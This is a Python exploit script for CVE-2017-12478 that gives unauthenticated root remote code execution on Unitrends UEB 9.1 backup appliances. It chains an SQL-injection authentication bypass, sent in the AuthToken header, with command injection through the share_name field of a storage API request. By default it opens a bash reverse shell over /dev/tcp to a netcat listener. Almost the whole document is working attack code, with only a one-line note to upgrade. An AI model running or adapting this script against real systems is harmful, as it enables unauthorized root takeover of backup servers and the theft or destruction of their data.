# Exploit Title: Unauthenticated root RCE for Unitrends UEB 9.1
# Date: 08/08/2017
# Exploit Authors: Cale Smith, Benny Husted, Jared Arave
# Contact: https://twitter.com/iotennui || https://twitter.com/BennyHusted || https://twitter.com/0xC413
# Vendor Homepage: https://www.unitrends.com/
# Software Link: https://www.unitrends.com/download/enterprise-backup-software
# Version: 9.1
# Tested on: CentOS6
# CVE: CVE-2017-12478

import httplib
import urllib
import ssl
import random
import sys
import base64
import string
from optparse import OptionParser

# Print some helpful words:
print """
###############################################################################
Unauthenticated root RCE for Unitrends UEB 9.1
Tested against appliance versions:
  [+] 9.1.0-2.201611302120.CentOS6

This exploit leverages a sqli vulnerability for authentication bypass,
together with command injection for subsequent root RCE. 

To use the exploit as written, make sure you're running a reverse
shell listener somewhere, using a command like:

$ nc -nlvp 1234

Then, just specify the ip and port of the remote listener in the 
exploit command. Alternatively, modify this exploit to contain a 
command of your choosing by modifying the 'cmd' variable below.
###############################################################################
"""

# Disable SSL Cert validation
if hasattr(ssl, '_create_unverified_context'):
            ssl._create_default_https_context = ssl._create_unverified_context

# Parse command line args:
usage = "Usage: %prog -r <appliance_ip> -l <listener_ip> -p <listener_port>\n"\
	    "       %prog -c 'touch /tmp/foooooooooooo'"

parser = OptionParser(usage=usage)
parser.add_option("-r", '--RHOST', dest='rhost', action="store",
				  help="Target host w/ UNITRENDS UEB installation")
parser.add_option("-l", '--LHOST', dest='lhost', action="store",
				  help="Host listening for reverse shell connection")
parser.add_option("-p", '--LPORT', dest='lport', action="store",
				  help="Port on which nc is listening")
parser.add_option("-c", '--cmd', dest='cmd', action="store",
				  help="Run a custom command, no reverse shell for you.")

(options, args) = parser.parse_args()

if options.cmd:
	if (options.lhost or options.lport):
		parser.error("[!] Options --cmd and [--LHOST||--LPORT] are mututally exclusive.\n")

	elif not options.rhost:
		parser.error("[!] No remote host specified.\n")

elif options.rhost is None or options.lhost is None or options.lport is None:
	parser.print_help()
	sys.exit(1)

RHOST = options.rhost
LHOST = options.lhost
LPORT = options.lport
if options.cmd:
	cmd = options.cmd
else:
	cmd = 'bash -i >& /dev/tcp/{0}/{1} 0>&1 &'.format(LHOST, LPORT)

url = '/api/storage/'

# Here, a SQLi string overrides the uuid, providing auth bypass.
# We'll need to base64 encode before sending... 
auth = base64.b64encode("v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0")

params = urllib.urlencode({'auth' : auth})

params = """{{"type":4,"name":"aaaaaaaa","usage":"archive","properties":{{"username":"km","password":"km","port":"445","hostname":"asdf.com","protocol":"cifs","share_name":"`{0}`"}}}}""".format(cmd)

headers = {'Host' : RHOST,
		   'Content-Type' : 'application/json',
		   'X-Requested-With' : 'XMLHttpRequest',
		   'AuthToken' : auth }

# Establish an HTTPS connection and send the payload.
conn = httplib.HTTPSConnection(RHOST, 443)
conn.set_debuglevel(1)

print """
[+] Sending payload to remote host [https://{0}]
[+] Here's some debug info:
""".format(RHOST)

conn.request("POST", url, params, headers=headers)
r1 = conn.getresponse()

print ""
print "[+] Request sent. Maybe your command was executed?"
print ""

# Print response, for debug purposes.
print r1.status, r1.reason
print r1.read()

# 3. Solution:
# Update to Unitrends UEB 10